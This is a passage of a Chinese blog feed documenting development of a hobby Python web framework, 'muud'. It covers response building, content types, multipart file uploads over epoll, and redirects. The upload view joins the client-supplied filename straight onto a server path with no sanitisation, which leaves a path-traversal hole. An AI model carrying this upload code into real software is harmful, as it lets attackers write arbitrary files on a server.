    <published>2023-06-01T12:15:29.000Z</published>
    <updated>2023-06-06T07:15:20.342Z</updated>
    
    <content type="html"><![CDATA[<p>从0到1开发一个勉强能用的python web“框架”</p><p>项目地址：<a href="https://github.com/Joe1sn/muud">https://github.com/Joe1sn/muud</a></p><span id="more"></span><h1 id="主要改进"><a class="markdownIt-Anchor" href="#主要改进"></a> 主要改进</h1><h2 id="6-1-返回报文设置"><a class="markdownIt-Anchor" href="#6-1-返回报文设置"></a> 6-1 返回报文设置</h2><p>首先将原来的拼接字符串改为了Response类，实现HTTP报文字段的自定义</p><p>这样可以大大简化<code>view.py</code>中的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Response</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, <span class="built_in">type</span>=<span class="string">&quot;json&quot;</span>, status_code=<span class="number">200</span>, </span></span><br><span class="line"><span class="params">                        reply=<span class="string">&quot;&quot;</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.content_type = content_types[<span class="built_in">type</span>]</span><br><span class="line">        self.status_code = status_code</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span> == <span class="string">&quot;json&quot;</span>: </span><br><span class="line">            self.reply = json.dumps(reply, ensure_ascii=<span class="literal">False</span>).encode(<span class="string">&#x27;unicode_escape&#x27;</span>).decode()</span><br><span class="line">        <span class="keyword">else</span>:   self.reply = reply</span><br><span class="line">        self.length = <span class="built_in">len</span>(self.reply)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">consum</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        result = <span class="string">&quot;&quot;</span></span><br><span class="line">        result += <span class="string">&quot;HTTP/1.1 &#123;status_code&#125; &#123;msg&#125;\r\n&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            status_code=self.status_code,   msg=status_code_dict[self.status_code])</span><br><span class="line">        result += <span class="string">&quot;Content-Type: &#123;type&#125;\r\n&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            <span class="built_in">type</span> = self.content_type)</span><br><span class="line">        result += <span class="string">&quot;Content-Length: &#123;length&#125;\r\n&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            length=self.length)</span><br><span class="line">        result += <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">        result += self.reply</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>这样就可以更简单的编写视图函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@http_api</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">html_test</span>(<span class="params">http_request</span>):</span><br><span class="line">    data = <span class="string">&quot;&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hello, world!&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span></span><br><span class="line">    result = Response(reply=data,<span class="built_in">type</span>=<span class="string">&quot;html&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> result.consum().encode()</span><br></pre></td></tr></table></figure><p>不过任然欠缺文件服务，不过在<code>epoll</code>服务器的send部分修改就行了，更复杂的还涉及到文件上传等，后续实现http.server这种服务效果，不然静态网页加载很麻烦。</p><h2 id="6-2-设置更多的content_type"><a class="markdownIt-Anchor" href="#6-2-设置更多的content_type"></a> 6-2 设置更多的content_type</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">content_types = &#123;</span><br><span class="line">    <span class="string">&quot;text&quot;</span>: <span class="string">&quot;text/plain&quot;</span>,</span><br><span class="line">    <span class="string">&quot;html&quot;</span>: <span class="string">&quot;text/html&quot;</span>,    <span class="comment">#HTML文档</span></span><br><span class="line">    <span class="string">&quot;css&quot;</span> : <span class="string">&quot;text/css&quot;</span>,     <span class="comment">#CSS样式表</span></span><br><span class="line">    <span class="string">&quot;js&quot;</span> : <span class="string">&quot;text/javascript&quot;</span>,   <span class="comment">#JavaScript脚本</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;json&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pdf&quot;</span>: <span class="string">&quot;application/pdf&quot;</span>,</span><br><span class="line">    <span class="string">&quot;xml&quot;</span>: <span class="string">&quot;application/xml&quot;</span>,</span><br><span class="line">    <span class="string">&quot;bin&quot;</span>: <span class="string">&quot;application/octet-stream&quot;</span>,  <span class="comment">#[特质]</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;jpeg&quot;</span>: <span class="string">&quot;image/jpeg&quot;</span>,   <span class="comment">#JPEG图像</span></span><br><span class="line">    <span class="string">&quot;png&quot;</span>: <span class="string">&quot;image/png&quot;</span>,     <span class="comment">#PNG图像</span></span><br><span class="line">    <span class="string">&quot;gif&quot;</span>: <span class="string">&quot;image/gif&quot;</span>,     <span class="comment">#GIF图像</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;mpeg&quot;</span>: <span class="string">&quot;audio/mpeg&quot;</span>,   <span class="comment">#MPEG音频</span></span><br><span class="line">    <span class="string">&quot;wav&quot;</span>: <span class="string">&quot;audio/wav&quot;</span>,     <span class="comment">#WAV音频</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;mp4&quot;</span> : <span class="string">&quot;video/mp4&quot;</span>,    <span class="comment">#MP4视频</span></span><br><span class="line">    <span class="string">&quot;mpeg&quot;</span> : <span class="string">&quot;video/mpeg&quot;</span>,  <span class="comment">#MPEG视频</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Response的返回改为bytes类型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">consum</span>(<span class="params">self</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    result += <span class="string">&quot;HTTP/1.1 &#123;status_code&#125; &#123;msg&#125;\r\n&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">        status_code=self.status_code,   msg=status_code_dict[self.status_code])</span><br><span class="line">    result += <span class="string">&quot;Content-Type: &#123;type&#125;\r\n&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">        <span class="built_in">type</span> = self.content_type)</span><br><span class="line">    result += <span class="string">&quot;Content-Length: &#123;length&#125;\r\n&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">        length=self.length)</span><br><span class="line">    result += <span class="string">&quot;\r\n&quot;</span></span><br><span class="line"></span><br><span class="line">    result = result.encode()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(self.reply) == <span class="built_in">bytes</span>:</span><br><span class="line">        result += self.reply</span><br><span class="line">    <span class="keyword">else</span>:   result += self.reply.encode()</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>这样就能直接访问各种文件了，方便下一步渲染</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@http_api</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file_test</span>(<span class="params">http_request</span>):</span><br><span class="line">    result=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&quot;/mnt/d/Github/muud/test/test.pdf&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        result = f.read()</span><br><span class="line">    result = Response(reply=result,<span class="built_in">type</span>=<span class="string">&quot;pdf&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> result.consum()</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/82845027c13d1eb42726354e98f2a0bc.png" alt="image-20230603110534674" /></p><h2 id="6-3~4-文件上传"><a class="markdownIt-Anchor" href="#6-3~4-文件上传"></a> 6-3~4 文件上传</h2><p>这部分写的挺久的，因为涉及到epoll模型的改善，后面回继续改进这个模块</p><p>首先有这两个视图函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@http_api</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file_upload</span>(<span class="params">http_request</span>):</span><br><span class="line">    result=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&quot;/mnt/d/Github/muud/test/file_upload.html&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        result = f.read()</span><br><span class="line">    result = Response(reply=result,<span class="built_in">type</span>=<span class="string">&quot;html&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> result.consum()</span><br><span class="line"></span><br><span class="line"><span class="meta">@http_api</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>(<span class="params">http_request</span>):</span><br><span class="line">    result=<span class="string">&quot;&quot;</span></span><br><span class="line">    info(<span class="string">&quot;FILE Content&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&quot;</span>)</span><br><span class="line">    <span class="comment"># info(http_request.data[&quot;len&quot;]/1024,&quot;KB&quot;)</span></span><br><span class="line">    name = http_request.data[<span class="string">&quot;filename&quot;</span>]</span><br><span class="line">    <span class="comment"># print(http_request.data[&quot;file&quot;][:0x20])</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&quot;/mnt/d/Github/muud/test/&quot;</span>+name,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        result = f.write(http_request.data[<span class="string">&quot;file&quot;</span>])</span><br><span class="line">    data = <span class="string">&quot;&lt;html&gt;&lt;body&gt;&lt;h1&gt;okok&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span></span><br><span class="line">    result = Response(reply=data,<span class="built_in">type</span>=<span class="string">&quot;html&quot;</span>,status_code=<span class="number">200</span>)</span><br><span class="line">    <span class="keyword">return</span> result.consum()</span><br></pre></td></tr></table></figure><p>目前参考了Django的上传，把数据结果收集在request中然后处理</p><p>那么就涉及HttpRequest的处理</p><p>首先新增了两个字段</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">self.length = <span class="number">0</span>     <span class="comment">#总长度</span></span><br><span class="line">self.cur_len = <span class="number">0</span>    <span class="comment">#当前长度</span></span><br></pre></td></tr></table></figure><p>从这个判断文件上传是否完成，然后就是消息的提取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#文件上传，返回bytes类型数据</span></span><br><span class="line"><span class="keyword">elif</span> <span class="string">&quot;multipart&quot;</span> <span class="keyword">in</span> content_type:</span><br><span class="line">    pre_len = <span class="built_in">len</span>(self.raw_data.split(<span class="string">b&quot;\r\n\r\n&quot;</span>)[<span class="number">0</span>])+<span class="number">4</span></span><br><span class="line">    raw_data = self.raw_data[pre_len:]</span><br><span class="line">    self.cur_len = <span class="built_in">len</span>(raw_data)</span><br><span class="line">    self.data=&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;&quot;</span>,   <span class="string">&quot;filename&quot;</span>:<span class="string">&quot;&quot;</span>,  <span class="string">&quot;file&quot;</span>:<span class="string">b&quot;&quot;</span>, <span class="string">&quot;len&quot;</span>:<span class="number">0</span>&#125;</span><br><span class="line">    boundary = <span class="string">b&quot;--&quot;</span> + r_boundary.search(self.raw_data).group(<span class="number">1</span>)</span><br><span class="line">    file_info = raw_data.split(boundary)[<span class="number">1</span>].split(<span class="string">b&quot;\r\n&quot;</span>)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> attribute <span class="keyword">in</span> file_info.split(<span class="string">b&quot;; &quot;</span>):</span><br><span class="line">        <span class="comment">#   获得名字</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;name&quot;</span> <span class="keyword">in</span> attribute <span class="keyword">and</span> <span class="string">b&quot;=&quot;</span> <span class="keyword">in</span> attribute <span class="keyword">and</span> <span class="keyword">not</span> attribute.lower().startswith(<span class="string">b&quot;content&quot;</span>):</span><br><span class="line">            <span class="keyword">if</span> attribute.split(<span class="string">b&quot;=&quot;</span>)[<span class="number">0</span>] == <span class="string">b&quot;name&quot;</span>:</span><br><span class="line">                self.data[<span class="string">&quot;name&quot;</span>] = <span class="string">b&quot;&quot;</span>.join(attribute.split(<span class="string">b&quot;=&quot;</span>)[<span class="number">1</span>:])[<span class="number">1</span>:-<span class="number">1</span>].decode()</span><br><span class="line">            <span class="keyword">elif</span> attribute.split(<span class="string">b&quot;=&quot;</span>)[<span class="number">0</span>] == <span class="string">b&quot;filename&quot;</span>:</span><br><span class="line">                <span class="comment">#   获得原始文件名</span></span><br><span class="line">                self.data[<span class="string">&quot;filename&quot;</span>] = <span class="string">b&quot;&quot;</span>.join(attribute.split(<span class="string">b&quot;=&quot;</span>)[<span class="number">1</span>:])[<span class="number">1</span>:-<span class="number">1</span>].decode()</span><br><span class="line"></span><br><span class="line">    file_type = raw_data.split(boundary)[<span class="number">1</span>].split(<span class="string">b&quot;\r\n&quot;</span>)[<span class="number">2</span>]</span><br><span class="line">    pre_len = <span class="built_in">len</span>(file_info) + <span class="built_in">len</span>(file_type) + <span class="number">2</span>*<span class="number">4</span> <span class="comment">#前置长度</span></span><br><span class="line"></span><br><span class="line">    self.data[<span class="string">&quot;file&quot;</span>] = self.raw_data.split(boundary)[<span class="number">1</span>][pre_len:-<span class="number">2</span>]</span><br><span class="line">    self.data[<span class="string">&quot;len&quot;</span>] = <span class="built_in">len</span>(self.data[<span class="string">&quot;file&quot;</span>])</span><br></pre></td></tr></table></figure><p>由于使用了epoll模型，当上传的数据长度小于总长度时继续上传，完成后再进行处理，那么server就会有如下修改</p><p>数据可读时继续读取客户端发送过来的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elif</span> event &amp; select.EPOLLIN:</span><br><span class="line">    <span class="comment"># 有数据可读</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = <span class="string">b&quot;&quot;</span></span><br><span class="line">        data = connections[fileno].recv(<span class="number">1024</span>*<span class="number">1024</span>*<span class="number">10</span>)</span><br><span class="line">        <span class="comment"># print(&quot;data from server\n&quot;,data)</span></span><br><span class="line">        <span class="keyword">if</span> data:</span><br><span class="line">            requests[fileno] += data</span><br></pre></td></tr></table></figure><p>由于我的epoll对每个发送过来的package都有一个response，所以需要修改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 处理请求并生成响应</span></span><br><span class="line"><span class="keyword">for</span> fileno, data <span class="keyword">in</span> requests.items():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;HTTP&quot;</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">b&quot;http&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">        <span class="comment"># 解析请求头部</span></span><br><span class="line">        http = HTTPRequest(data=data, fileno=fileno, connections=connections)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> http.cur_len &lt; http.length:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            http.show()</span><br><span class="line">            http_route = HTTPRouter(http)</span><br><span class="line">            response = http_route.route()</span><br><span class="line">            responses[fileno] = response</span><br><span class="line"></span><br><span class="line">            connections[fileno].send(response)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 构造响应头部和内容</span></span><br><span class="line">            <span class="comment"># 清空请求缓冲区</span></span><br><span class="line">            response = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">            data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">            requests[fileno] = <span class="string">b&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/d560daa9e9524c8c670e0fb8ee5109d2.png" alt="image-20230604123749998" /></p><p>然后测试了下效率，面对小文件的时候效率还说得过去（&lt;10MB），大文件的话又是使用的是对应<code>fd</code>的data进行拼接，增大了内存开销和CPU开销（不知道使用c的指针会不会快一些），这也是后续需要优化的东西</p><p><img src="https://img.joe1sn.top/uploads/big/6ec85adf5a170138cfaf12cf96bf7bc5.png" alt="小文件" /></p><p><img src="https://img.joe1sn.top/uploads/big/aa1d26b05febf943087b4b4fba07ba4a.png" alt="大文件" /><img src="https://img.joe1sn.top/uploads/big/516a0bd7170f4b3101a24eaf0b62fc58.png" alt="大文件2" /></p><p>更大的文件后面会出现指数级下降，不过这里也可以看出来基于TCP的拥塞控制，单次发包最大为128kb，分块传输，后续可以针对这些特性进行改进。</p><h2 id="6-6-重定向"><a class="markdownIt-Anchor" href="#6-6-重定向"></a> 6-6 重定向</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@http_api</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redirect</span>(<span class="params">http_request</span>):</span><br><span class="line">    data= <span class="string">&quot;http://www.qq.com&quot;</span></span><br><span class="line">    result = Response(reply=data,<span class="built_in">type</span>=<span class="string">&quot;text&quot;</span>,status_code=<span class="number">302</span>)</span><br><span class="line">    <span class="keyword">return</span> result.consum()</span><br></pre></td></tr></table></figure><p>主要就是通过302跳转进行重定向，然后在返回报文哪里设置了几个新的参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">consum</span>(<span class="params">self</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> self.status_code == <span class="number">302</span>:</span><br><span class="line">        result += <span class="string">&quot;HTTP/1.1 &#123;status_code&#125; &#123;msg&#125;\r\nLocation: &#123;location&#125;\r\n\r\n&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            status_code=self.status_code,   msg=status_code_dict[self.status_code], location=self.reply)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result += <span class="string">&quot;HTTP/1.1 &#123;status_code&#125; &#123;msg&#125;\r\n&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            status_code=self.status_code,   msg=status_code_dict[self.status_code])</span><br><span class="line">    result += <span class="string">&quot;Content-Type: &#123;type&#125;\r\n&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">        <span class="built_in">type</span> = self.content_type)</span><br><span class="line">    result += <span class="string">&quot;Content-Length: &#123;length&#125;\r\n&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">        length=self.length)</span><br><span class="line">    result += <span class="string">&quot;\r\n&quot;</span></span><br><span class="line"></span><br><span class="line">    result = result.encode()</span><br><span class="line">    <span class="keyword">if</span> self.status_code == <span class="number">302</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(self.reply) == <span class="built_in">bytes</span>:</span><br><span class="line">            result += self.reply</span><br><span class="line">        <span class="keyword">else</span>:   result += self.reply.encode()</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>之后可以在utils里面打包这些方法，我这里放在http_response下面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 重定向</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redirect</span>(<span class="params">http_url</span>):</span><br><span class="line">    data= <span class="built_in">str</span>(http_url)</span><br><span class="line">    result = Response(reply=data,<span class="built_in">type</span>=<span class="string">&quot;text&quot;</span>,status_code=<span class="number">302</span>)</span><br><span class="line">    <span class="keyword">return</span> result.consum()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;从0到1开发一个勉强能用的python web“框架”&lt;/p&gt;
&lt;p&gt;项目地址：&lt;a href=&quot;https://github.com/Joe1sn/muud&quot;&gt;https://github.com/Joe1sn/muud&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="program" scheme="https://joe1sn.eu.org/categories/program/"/>
    
    
    <category term="muud" scheme="https://joe1sn.eu.org/tags/muud/"/>
    
    <category term="web framework" scheme="https://joe1sn.eu.org/tags/web-framework/"/>
    
  </entry>
  
  <entry>
    <title>【Muud开发】1.基础结构解析</title>
    <link href="https://joe1sn.eu.org/2023/06/01/web-0x1/"/>
    <id>https://joe1sn.eu.org/2023/06/01/web-0x1/</id>
    <published>2023-05-31T17:43:18.000Z</published>
    <updated>2023-06-01T14:31:23.538Z</updated>
    
    <content type="html"><![CDATA[<p>从0到1开发一个勉强能用的python web“框架”</p><p>项目地址：<a href="https://github.com/Joe1sn/muud">https://github.com/Joe1sn/muud</a></p><span id="more"></span><h1 id="简单介绍"><a class="markdownIt-Anchor" href="#简单介绍"></a> 简单介绍</h1><p>​在毕业设计的时候，初始选题为《基于XMPP的即时通讯系统》，想的是自己照着RFC写一遍XMPP协议，但是时间不够（毕竟要上班）。所以把废案再利用，抽出其中的一些部分，<strong>从Socket到web框架</strong>，实现一个简单的CURD功能，锻炼一下自己的文档化编程能力。受我个人能力有限会随时断更，一路上只有vscode和chatGPT以及所需要的RFC文档。</p><p>​再说说已实现的部分，首先是确定在Linux上运行的，使用python语言</p><ul><li><p>使用epoll模型完成了部分HTTP服务器的功能</p><p><img src="https://img.joe1sn.top/uploads/big/dbd4bb8a1731037c6334379055b450bc.png" alt="image-20230601015224293" /></p></li><li><p>sqlalchemy完成了数据库的ORM实现</p><p><img src="https://img.joe1sn.top/uploads/big/e832ffc52b70c65e6e796d14c5492273.png" alt="数据库实现" /></p><p><img src="https://img.joe1sn.top/uploads/big/204faa35fc0267fca1b4b8dd4e05f435.png" alt="ORM使用示例" /></p></li><li><p>路由通过闭包完成</p><p><img src="https://img.joe1sn.top/uploads/big/9a90cd82302a2b47ca3be38818feccc7.png" alt="image-20230601015455217" /></p><p><img src="https://img.joe1sn.top/uploads/big/326180139c370cd9bb466210db93314d.png" alt="image-20230601015736199" /></p></li><li><p>视图部分编写（只考虑JSON传递）</p><p><img src="https://img.joe1sn.top/uploads/big/55f5abfa762abc34bf49fe4d6389f374.png" alt="image-20230601015921484" /></p><p><img src="https://img.joe1sn.top/uploads/big/306a31c86f6d380858ddc90d451683af.png" alt="image-20230601015909570" /></p></li><li><p>启动部分参考了Django的设计</p><p><img src="https://img.joe1sn.top/uploads/big/0967be71afa21dab39ca0ca3f4809ea4.png" alt="image-20230601020119447" /></p></li></ul><p>最后运行的效果</p><p><img src="https://img.joe1sn.top/uploads/big/ef7a4d4dbaea1b76e34445f36e3c71da.png" alt="image-20230601020247259" /></p><h1 id="需求分析"><a class="markdownIt-Anchor" href="#需求分析"></a> 需求分析</h1><p>根据ChatGPT，一个典型的Python Web框架通常由以下几个核心组件组成：</p><ol><li>路由（Routing）：路由用于将传入的HTTP请求映射到相应的处理程序或视图函数上。它确定了不同URL路径与应用程序中的不同功能点之间的关联关系。</li><li>视图（Views）：视图是处理HTTP请求并生成HTTP响应的函数或方法。它们接收来自路由的请求并执行相应的逻辑，最后返回响应给客户端。</li><li>模板引擎（Template Engine）：模板引擎允许开发者将静态模板和动态数据结合，生成最终的HTML响应。模板引擎通常支持模板语法、变量替换、条件判断、循环等功能，以简化动态内容的生成。</li><li>中间件（Middleware）：中间件是位于请求和视图之间的组件，用于在请求到达视图之前或响应返回客户端之前执行一些通用的功能。中间件可以处理身份验证、请求预处理、错误处理等任务。</li><li>数据库访问（Database Access）：Web框架通常提供了对数据库的支持，以便应用程序可以与数据库进行交互。这包括连接数据库、执行查询和操作、ORM（对象关系映射）等功能。</li><li>表单处理（Form Handling）：Web应用程序通常需要处理用户提交的表单数据。框架提供了表单验证、数据绑定、错误处理等功能，使开发者可以方便地处理表单数据。</li><li>身份验证与授权（Authentication and Authorization）：身份验证用于验证用户的身份，而授权则用于确定用户是否有权限执行特定操作。框架通常提供了身份验证和授权的支持，以便开发者可以轻松实现用户认证和授权功能。</li><li>测试框架（Testing Framework）：测试框架用于编写和执行自动化测试，以确保应用程序的正确性和稳定性。它提供了测试用例的编写、运行和断言等功能。</li></ol><p>后来的项目像参考Django的设计</p><p>目前项目缺少的：</p><ul><li>模板渲染：设计的时候考虑到前后端分离是开发，没有想过渲染</li><li>中间件：完全没有设计</li><li>表单处理：完全没有设计</li><li>测试框架：还在学</li></ul><p>对于Django这样的框架来说，开启一个项目后，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── 开启的app名称</span><br><span class="line">│   ├── admin.py</span><br><span class="line">│   ├── apps.py</span><br><span class="line">│   ├── __init__.py</span><br><span class="line">│   ├── migrations</span><br><span class="line">│   ├── models.py</span><br><span class="line">│   ├── tests.py</span><br><span class="line">│   └── views.py</span><br><span class="line">├── 项目名称</span><br><span class="line">│   ├── asgi.py</span><br><span class="line">│   ├── __init__.py</span><br><span class="line">│   ├── settings.py</span><br><span class="line">│   ├── urls.py</span><br><span class="line">│   └── wsgi.py</span><br><span class="line">├── manage.py</span><br><span class="line">├── static</span><br><span class="line">└── 